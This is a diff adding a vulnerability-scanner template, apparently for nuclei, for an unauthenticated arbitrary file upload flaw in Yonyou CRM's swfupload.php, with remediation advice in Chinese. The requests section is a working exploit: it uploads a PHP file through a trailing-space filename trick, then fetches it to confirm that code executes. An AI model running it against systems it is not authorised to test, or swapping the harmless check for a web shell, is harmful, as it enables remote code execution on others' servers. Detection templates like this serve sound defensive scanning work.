@@ -1,0 +1,67 @@
+id: wooyun-2015-0137238
+info:
+  name: 用友CRM swfupload任意文件上传
+  author:
+  - 折跃
+  description: |-
+    用友CRM swfupload任意文件上传漏洞
+    用友CRM客户关系管理系统是一套基于B/S架构、互联网模式应用普及的信息化趋势，专为中小企业提供包括客户管理、销售管理、项目管理等应用的在线CRM。
+
+    用友CRM存在任意文件上传漏洞。远程攻击者可以利用该漏洞上传文件并执行代码。
+  severity: critical
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    https://www.yonyou.com/
+
+    临时修复方案：
+    1、服务器端将文件上传目录直接设置为不可执行。
+    2、文件类型检查：建议使用白名单方式（比黑名单更可靠），并结合MIME Type、后缀检查等方式（文件类型做白名单限制）。此外对于图片的处理可以使用压缩函数或resize函数，处理图片的同时破坏其包含的HTML代码。
+    3、使用随机数改写文件名和文件路径，使得用户不能轻易访问自己上传的文件。
+    4、单独设置文件服务器的域名。
+    5、验证文件内容，使用正则匹配恶意代码（过滤恶意代码各种绕过方式，如大小写、BASE64编码）限制上传。
+    6、修复服务器可能存在的解析漏洞。
+    7、严格限制可以修改服务器配置的文件上传如：.htaccess。
+    8、隐藏上传文件路径。
+    9、及时修复Web上传代码。
+    10、不能有本地文件包含漏洞。
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code_2==200
+    - contains(body_2,verify)
+  extractors:
+  - name: uploadFile
+    type: regex
+    regex:
+    - (\w+.tmp.php)
+    group: 1
+    part: body
+    internal: true
+  raw:
+  - |
+    POST /ajax/swfupload.php?DontCheckLogin=1&vname=file HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAVuAKsvesmnWtgEP
+    Cookie: PHPSESSID=ibru7pqnplhi720caq0ev8uvt0
+
+    ------WebKitFormBoundaryAVuAKsvesmnWtgEP
+    Content-Disposition: form-data; name="file"; filename="{{filename}}.php "
+    Content-Type: application/octet-stream
+
+    <?php echo {{verify}};unlink(__FILE__);?>
+    ------WebKitFormBoundaryAVuAKsvesmnWtgEP
+    Content-Disposition: form-data; name="upload"
+
+    upload
+    ------WebKitFormBoundaryAVuAKsvesmnWtgEP--
+  - |
+    GET /tmpfile/{{uploadFile}} HTTP/1.1
+    Host: {{Hostname}}
+  req-condition: true
+variables:
+  filename: '{{rand_text_alphanumeric(8,"")}}'
+  verify: '{{rand_text_alphanumeric(32,"")}}'
